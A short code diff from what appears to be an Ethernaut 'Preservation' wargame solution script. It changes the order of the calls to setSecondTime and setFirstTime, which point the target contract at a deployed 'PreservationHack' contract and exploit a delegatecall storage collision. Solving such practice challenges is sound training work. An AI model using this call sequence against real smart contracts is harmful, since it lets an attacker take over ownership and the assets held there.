@@ -30,7 +30,7 @@ async function main() {
   console.log(`PreservationHack deployed to ${preservationHack.address}`);
 
   console.log(`Starting to hack ${targetContractAddress}`)
-  await preservation.setFirstTime(preservationHack.address);
+  await preservation.setSecondTime(preservationHack.address);
   await preservation.setFirstTime(preservationHack.address);
 
 
